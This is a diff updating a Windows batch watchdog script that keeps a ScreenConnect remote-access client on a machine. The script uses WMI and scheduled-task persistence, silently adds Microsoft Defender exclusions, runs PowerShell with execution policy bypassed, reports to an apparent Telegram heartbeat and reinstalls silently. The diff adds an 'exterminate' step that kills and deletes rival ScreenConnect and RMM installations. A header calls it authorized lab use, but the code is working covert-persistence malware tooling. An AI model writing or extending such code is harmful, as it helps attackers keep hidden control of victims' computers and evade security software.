@@ -1,6 +1,6 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260802M12
+rem  OWN_MON  BUILD 20260802M13
 rem  Persistent watchdog - identity-aware (anti-signature), mutual
 rem  WMI+schtasks chains, MSI fallback chain, state.json, digest HB.
 rem  Authorized internal deployment - lab/competition scope only.
@@ -31,7 +31,7 @@ set "MSI=%ProgramData%\ScreenConnect.ClientSetup.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M12"
+set "MONVER=M13"
 set "PF86=%ProgramFiles(x86)%"
 for /f "tokens=1-3 delims=/ " %%a in ("%date%") do set "DT=%date% %time%"
 echo.>>"%LOG%"
@@ -107,6 +107,21 @@ if exist "%WD%\own_lib.ps1" (
   if /I "!WD_STATE!"=="REARMED" echo watchdog WMI REARMED>>"%LOG%"
 )
 
+rem ── [E] exterminate foreign SC + disallowed RMM (BEFORE heal/install,
+rem     so the SC installer custom action never collides with rivals) ──
+if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
+set "FOREIGN_LEFT=0"
+for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
+  set "FP=%%a"
+  set "FP=!FP: =!"
+  set /a COUNT+=1
+  if /I not "!FP!"=="%KEEP_FP%" if /I not "!FP!"=="%ALT_FP%" (
+    set /a FOREIGN_LEFT+=1
+    set "FOREIGN_LIST=!FOREIGN_LIST!!FP! "
+    echo foreign_left_!FP!>>"%LOG%"
+  )
+)
+
 rem ── [C] heal ScreenConnect prim/alt ────────────────────────────
 for /f "tokens=1,2 delims=()" %%a in ('sc query "ScreenConnect Client (%KEEP_FP%)" ^| findstr /C:"SERVICE_NAME"') do (
   set /a COUNT+=1
@@ -128,9 +143,9 @@ if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
 if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
   powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "svc-wont-start" >nul 2>&1
   call :TgState DOWN "ScreenConnect (%KEEP_FP%) installed but wont start"
-  goto :ForeignCheck
+  goto :AfterHeal
 )
-if "%INSTALLED%"=="1" goto :ForeignCheck
+if "%INSTALLED%"=="1" goto :AfterHeal
 
 rem ── [D] primary SC missing - heal ladder ──────────────────────
 rem M12: FIRST repair the registered product (recreates service without
@@ -165,31 +180,8 @@ if "%INSTALLED%"=="0" (
   call :TgState RESTORED "ScreenConnect reinstalled OK"
 )
 
-:ForeignCheck
-rem ── [E] nuke foreign SC services + dirs (never touch allowlist) ──
-for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
-  set "FP=%%a"
-  set "FP=!FP: =!"
-  set /a COUNT+=1
-  if /I not "!FP!"=="%KEEP_FP%" if /I not "!FP!"=="%ALT_FP%" (
-    set /a FOREIGN_LEFT+=1
-    set "FOREIGN_LIST=!FOREIGN_LIST!!FP! "
-    sc stop "ScreenConnect Client (!FP!)" >nul 2>&1
-    sc delete "ScreenConnect Client (!FP!)" >nul 2>&1
-    echo nuke_foreign_svc_!FP!>>"%LOG%"
-  )
-)
-if exist "%PF86%" for /d %%D in ("%PF86%\ScreenConnect Client (*)") do (
-  set "DN=%%~nxD"
-  set "DFP=!DN:ScreenConnect Client (=!"
-  set "DFP=!DFP:)=!"
-  if /I not "!DFP!"=="%KEEP_FP!" if /I not "!DFP!"=="%ALT_FP!" (
-    powershell -NoProfile -NonInteractive -Command "Get-CimInstance Win32_Process -Filter 'Name like ''ScreenConnect%''' | Where-Object { $_.ExecutablePath -like '*!DFP!*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }" >nul 2>&1
-    rmdir /s /q "%%D" >nul 2>&1
-    if exist "%%D" rmdir /s /q "%%D" >nul 2>&1
-    if not exist "%%D" (echo nuke_foreign_dir_!DFP!>>"%LOG%") else (echo nuke_dir_failed_!DFP!>>"%LOG%")
-  )
-)
+:AfterHeal
+rem (extermination already ran pre-heal in [E]; foreign survivors counted there)
 
 rem ── [F] stealth re-secure (quiet Defender exclusion refresh) ──
 powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath '%WD%','%ETL%' -ErrorAction Stop } catch {}" >nul 2>&1
@@ -236,6 +228,13 @@ for %%F in ("%MSI%.tmp") do if %%~zF LEQ 1000000 (
 )
 move /y "%MSI%.tmp" "%MSI%" >nul 2>&1
 call :NoMsiPolicy
+rem M13: stale primary dir (service deleted, product unregistered) breaks
+rem the SC installer custom action - clear it before installing
+sc query "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
+if errorlevel 1 if exist "%PF86%\ScreenConnect Client (%KEEP_FP%)" (
+  echo stale_primary_dir_clean>>"%LOG%"
+  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
+)
 echo [%TAG%] msiexec install>>"%LOG%"
 msiexec /i "%MSI%" /qn /norestart /L*v "%WD%\msi_heal.log" >nul 2>&1
 set "MSIEXIT=!ERRORLEVEL!"
